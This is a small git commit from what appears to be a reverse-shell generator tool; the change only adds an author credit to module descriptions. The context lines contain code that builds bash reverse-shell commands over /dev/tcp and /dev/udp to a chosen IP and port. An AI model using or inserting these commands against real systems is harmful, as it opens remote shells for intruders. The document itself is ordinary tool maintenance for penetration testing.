12f1987ce38c28982cf1991c4508866607ab50bd
Nong Hoang Tu <dmknght@parrotsec.org>
2020-12-28 17:50:15 +0700

    Add module author in description

--- shellgen/modules/linux/shell.py
+++ shellgen/modules/linux/shell.py
@@ -11,6 +11,7 @@ class ReverseTCP(plugin.ReverseShell):
             help="Select shell type on target machine"
         )
         self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
         self.shell = "{} -i >& /dev/tcp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
@@ -26,6 +27,7 @@ class ReverseUDP(plugin.ReverseShell):
             help="Select shell type on target machine"
         )
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
         self.shell = "{} -i >& /dev/udp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
